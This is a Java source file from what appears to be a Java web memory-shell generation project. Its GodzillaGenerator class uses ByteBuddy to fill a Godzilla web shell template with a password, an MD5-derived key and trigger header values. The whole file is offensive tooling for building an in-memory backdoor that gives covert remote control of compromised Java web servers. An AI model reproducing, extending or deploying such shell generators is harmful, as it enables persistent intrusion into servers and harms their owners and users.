package com.reajason.javaweb.memshell.shelltool.godzilla;

import com.reajason.javaweb.memshell.generator.ByteBuddyShellGenerator;

import com.reajason.javaweb.memshell.config.ShellConfig;
import net.bytebuddy.dynamic.DynamicType;
import com.reajason.javaweb.utils.DigestUtils;

import static net.bytebuddy.matcher.ElementMatchers.named;

/**
 * @author ReaJason
 * @since 2024/11/23
 */
public class GodzillaGenerator extends ByteBuddyShellGenerator<GodzillaConfig> {

    public GodzillaGenerator(ShellConfig shellConfig, GodzillaConfig godzillaConfig) {
        super(shellConfig, godzillaConfig);
    }

    @Override
    public DynamicType.Builder<?> getBuilder() {
        String md5Key = DigestUtils.md5Hex(shellToolConfig.getKey()).substring(0, 16);
        String md5 = DigestUtils.md5Hex(shellToolConfig.getPass() + md5Key).toUpperCase();
        return redefineTemplate()
                .field(named("pass")).value(shellToolConfig.getPass())
                .field(named("key")).value(md5Key)
                .field(named("md5")).value(md5)
                .field(named("headerName")).value(shellToolConfig.getHeaderName())
                .field(named("headerValue")).value(shellToolConfig.getHeaderValue());
    }
}